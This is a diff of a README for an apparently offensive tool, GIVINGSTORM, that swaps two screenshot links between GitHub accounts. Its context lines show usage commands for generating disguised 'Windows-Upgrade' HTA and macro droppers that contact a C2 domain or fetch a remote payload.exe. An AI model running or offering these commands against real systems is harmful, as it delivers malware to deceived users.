@@ -15,10 +15,10 @@ For the HTA payload:
   `python3 givingstorm.py -n Windows-Upgrade -p b64encodedpayload -c amazon.com/c2/domain`
 
 # HTA Example
-![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/hta.png)
+![alt text](https://github.com/LiveGray/GIVINGSTORM/blob/master/hta.png)
 
 For the Macro Subroutine:
   `python3 givingstorm.py -n Windows-Upgrade -e amazon.com/final/payload.exe`
 
 # Macro Example
-![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/macro.png)
+![alt text](https://github.com/LiveGray/GIVINGSTORM/blob/master/macro.png)
